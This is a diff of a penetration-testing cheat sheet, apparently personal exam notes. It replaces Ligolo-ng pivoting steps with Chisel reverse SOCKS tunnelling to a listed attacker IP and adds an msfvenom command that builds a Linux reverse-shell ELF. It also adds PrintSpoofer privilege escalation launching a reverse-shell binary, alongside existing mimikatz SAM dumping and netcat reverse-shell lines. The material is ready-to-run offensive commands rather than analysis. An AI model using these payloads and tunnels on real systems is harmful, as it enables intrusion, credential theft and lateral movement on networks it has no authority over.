@@ -635,26 +635,21 @@ lsadump::lsa /patch #both these dump SAM
 
 ```
 
-## Ligolo-ng
+## Chisel 
 
 ```powershell
-#Creating interface and starting it.
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
+#dynamic forwarding
+# In local machine
+chisel server -p 8080 --reverse
+#it default listen to loopback 8080 port, can check with below command
+ss -ntplu
+#check on win PS
+netstat -ano
 
-#Kali machine - Attacker machine
-./proxy -laddr 0.0.0.0:9001 -selfcert
+#we utilize Chisel on target to connect back to Kali on port 8080
+#192 is kali IP, and 1080 is for tunnel
+./chisel client 192.168.45.152:8080 R:1080:socks
 
-#windows or linux machine - compromised machine
-agent.exe -connect <LHOST>:9001 -ignore-cert
-
-#In Ligolo-ng console
-session #select host
-ifconfig #Notedown the internal network's subnet
-start #after adding relevent subnet to ligolo interface
-
-#Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
 
 ```
 
@@ -1138,6 +1133,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=<PORT> -f raw > shell.js
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=<PORT> -f war > shell.war
 msfvenom -p php/reverse_php LHOST=tun0 LPORT=<PORT> -f raw > shell.php
 ```
+#linux payload
+msfvenom -p linux/x86/shell_reverse_tcp -f elf -o rev88.elf LHOST=192.168.45.152 LPORT=1288
 
 ### One Liners
 
@@ -1222,7 +1219,8 @@ PrivescCheck.ps1
 - Command to check `whoami /priv`
 
 ```powershell
-#Printspoofer
+#Printspoofer, rev2.exe from msfvenom
+./Printspoofer.exe -i -c rev2.exe
 PrintSpoofer.exe -i -c powershell.exe 
 PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
 
